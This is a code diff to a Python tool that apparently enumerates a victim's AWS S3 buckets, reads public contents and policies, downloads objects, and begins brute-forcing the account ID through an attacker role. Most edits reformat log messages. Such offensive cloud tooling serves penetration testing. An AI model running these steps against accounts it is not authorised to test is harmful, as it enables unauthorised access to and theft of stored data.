@@ -28,21 +28,21 @@ def s3_init_enum(victim_s3_client, attacker_session):
         if public_buckets and my_globals.attacker_S3_role_arn and attacker_session :
             brute_force_aws_account_id(public_buckets, my_globals.attacker_S3_role_arn, attacker_session)
     else:
-        print(f"{Fore.LIGHTBLACK_EX}AWS account ID was found before, or already set. Skipping S3 AWS account ID brute-force.")
+        print(f"{Fore.LIGHTBLACK_EX} | AWS account ID was found before, or already set. Skipping S3 AWS account ID brute-force.")
 
 def list_buckets(s3_client):
     try:
-        print(f"{Fore.GREEN}Enumerating S3 Buckets...")
+        print(f"{Fore.GREEN}[+] Enumerating S3 Buckets:")
         found_buckets = []
         buckets = s3_client.list_buckets().get("Buckets", [])
         for bucket in buckets:
-            print(f"{Fore.MAGENTA}Found bucket: {bucket['Name']}")
+            print(f"{Fore.MAGENTA} | Found bucket: {bucket['Name']}")
             found_buckets.append(bucket['Name'])
         return found_buckets
     except KeyboardInterrupt:
         raise
     except Exception as e:
-        print(f"{Fore.LIGHTBLACK_EX}Failed to list S3 buckets")
+        print(f"{Fore.LIGHTBLACK_EX} | Failed to list S3 buckets")
         log_error(f"Failed to list S3 buckets\n | Error: {e}")
         return []
 
@@ -55,7 +55,7 @@ def download_public_bucket(s3_unsigned_client, buckets):
 def list_public_buckets(unsigned_s3_client, buckets):
     found_buckets = []
     if buckets:
-        print(f"{Fore.GREEN}Checking public S3 buckets without signing...")
+        print(f"{Fore.GREEN}[+] Checking public S3 buckets without signing:")
         for bucket in buckets:
             try:
                 response = unsigned_s3_client.list_objects_v2(Bucket=bucket)
@@ -65,39 +65,31 @@ def list_public_buckets(unsigned_s3_client, buckets):
                     for obj in response['Contents'][:5]:
                         print(f"{Fore.MAGENTA} | {obj['Key']}")
                 else:
-                    print(f"{Fore.LIGHTBLACK_EX}No public content or access denied for: {bucket}")
+                    print(f"{Fore.LIGHTBLACK_EX} | No public content or access denied for: {bucket}")
             except KeyboardInterrupt:
                 raise
             except Exception as e:
-                print(f"{Fore.LIGHTBLACK_EX}Failed to access bucket {bucket} anonymously")
+                print(f"{Fore.LIGHTBLACK_EX} | Failed to access bucket {bucket} anonymously")
                 log_error(f"Failed to access bucket {bucket} anonymously\n | Error: {e}")
     else:
-        print(f"{Fore.LIGHTBLACK_EX}No buckets provided, skipping public buckets check")
+        print(f"{Fore.LIGHTBLACK_EX} | No buckets provided, skipping public buckets check")
     return found_buckets
 
 def get_bucket_policy(s3_client, buckets):
     if buckets:
         for bucket in buckets:
             try:
-                response = requests.get(f'https://{bucket}.s3.amazonaws.com', verify=False)
-                if response.status_code != 404:
-                    bucket_region = response.headers['x-amz-bucket-region']
-                    print(f"{Fore.CYAN} | Bucket Region: {bucket_region}")
-                else:
-                    print(f"{Fore.LIGHTBLACK_EX} | Bucket {bucket} doesn't exist")
-                    log_error(f" | Error: Bucket {bucket} doesn't exist")
-                    break
-                print(f"{Fore.CYAN}Getting policy for bucket: {bucket}")
+                print(f"{Fore.CYAN} | Getting policy for bucket: {bucket}")
                 response = s3_client.get_bucket_policy(Bucket=bucket)
                 policy = json.loads(response['Policy'])
-                print(f"{Fore.YELLOW}{json.dumps(policy, indent=4, sort_keys=True, default=custom_serializer)}")
+                print(f"{Fore.YELLOW}   {json.dumps(policy, indent=4, sort_keys=True, default=custom_serializer)}")
             except KeyboardInterrupt:
                 raise
             except Exception as e:
                 print(f"{Fore.LIGHTBLACK_EX}Can't get bucket policy: {bucket}")
                 log_error(f"Can't get bucket policy: {bucket}\n | Error: {e}")
     else:
-        print(f"{Fore.LIGHTBLACK_EX}No buckets provided, skipping bucket policy check")
+        print(f"{Fore.LIGHTBLACK_EX} | No buckets provided, skipping bucket policy check")
 
 
 def ensure_dir_for_file(path):
@@ -111,7 +103,7 @@ def delete_failed_files(path):
 
 def download_bucket_objects(s3_client, buckets):
     if not buckets:
-        print(f"{Fore.LIGHTBLACK_EX}No buckets provided, skipping download bucket objects")
+        print(f"{Fore.LIGHTBLACK_EX} | No buckets provided, skipping download bucket objects")
         return
 
     for bucket in buckets:
@@ -172,14 +164,14 @@ def download_bucket_objects(s3_client, buckets):
 # Brute-force AWS Account ID from a public bucket
 def brute_force_aws_account_id(public_buckets, s3_role_arn, attacker_session):
     public_bucket = public_buckets[0]
-    print(f"{Fore.GREEN}Attempting to brute-force AWS account ID for bucket: {public_bucket}")
+    print(f"{Fore.GREEN}[+] Attempting to brute-force AWS account ID for bucket: {public_bucket}")
     bucket, key = to_s3_args(public_bucket)
 
     if not can_access_with_policy(attacker_session, bucket, key, s3_role_arn, {}):
         print(f"{Fore.LIGHTBLACK_EX}Role {s3_role_arn} cannot access {bucket}", file=sys.stderr)
         return
 
-    print(f"{Fore.CYAN}Starting brute-force of AWS Account ID (this can take a while)...")
+    print(f"{Fore.CYAN}Starting brute-force of AWS Account ID (this can take a while):")
     digits = ""
     for _ in range(12):
         for i in range(10):
